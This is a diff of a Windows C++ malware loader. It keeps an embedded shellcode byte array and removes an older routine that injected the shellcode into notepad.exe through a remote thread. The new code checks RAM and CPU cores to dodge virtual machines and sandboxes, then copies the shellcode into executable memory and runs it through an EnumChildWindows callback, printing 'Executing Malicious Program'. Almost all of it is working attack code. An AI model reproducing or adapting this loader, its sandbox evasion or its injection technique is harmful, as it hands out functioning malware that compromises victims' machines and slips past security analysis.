@@ -1,8 +1,8 @@
+#include <iostream>
 #include <windows.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <tlhelp32.h>
+#include "sysreq.h"
+ 
+using namespace std;
  
 char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -37,53 +37,29 @@ char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
 "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
 "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
-                                                    
-
- 
-unsigned int shellcodeSize = sizeof(shellcode);
- 
-// Function to get the Process ID (PID) by its name
-int getPIDbyProcName(const char* procName) {
-    int pid = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32 pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32);
- 
-    // Get the first process entry in the snapshot
-    if (Process32First(hSnap, &pe32) != FALSE) {
-        // Iterate through the running processes to find the process with the specified name
-        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
-            if (strcmp(pe32.szExeFile, procName) == 0) {
-                // Found the process with the matching name, store its PID
-                pid = pe32.th32ProcessID;
-            }
-        }
-    }
-    CloseHandle(hSnap);
-    return pid;
-}
  
 int main(){
-    // Get the PID of the process to inject into
-    int pid = getPIDbyProcName("notepad.exe");
-    if (pid == 0) {
-        printf("Process not found\n");
-        return 1;
+    cout << "Checking for VM or Sandbox...\n";
+    int ram;
+    int cores;
+    SysReq sysreq;
+    sysreq.getSysInfo();
+    ram = sysreq.getRam();
+    cores = sysreq.getCores();
+    if(ram < 8000 || cores < 4){
+        cout << "VM or Sandbox Detected.\n";
+        cout << "Ram: " << ram << "MB\n";
+        cout << "Cores: " << cores << "\n";
+        getchar();
+        return 0;
     }
- 
-    // Get a handle to the process
-    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
- 
-    // Allocate memory in the process for the shellcode
-    LPVOID hAlloc = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
- 
-    // Write the shellcode to the allocated memory
-    WriteProcessMemory(hProc, hAlloc, shellcode, shellcodeSize, NULL);
- 
-    // Create a thread in the process to execute the shellcode
-    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, NULL);
- 
-    // Wait for the thread to finish
-    WaitForSingleObject(hThread, INFINITE);
+    cout << "No VM or Sandbox Detected.\n";
+    cout << "Ram: " << ram << "MB\n";
+    cout << "Cores: " << cores << "\n";
+    cout << "Executing Malicious Program...\n";
+    HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(hAlloc, shellcode, sizeof(shellcode));
+    EnumChildWindows((HWND) NULL,(WNDENUMPROC) hAlloc,NULL);
+    getchar();
     return 0;
 }
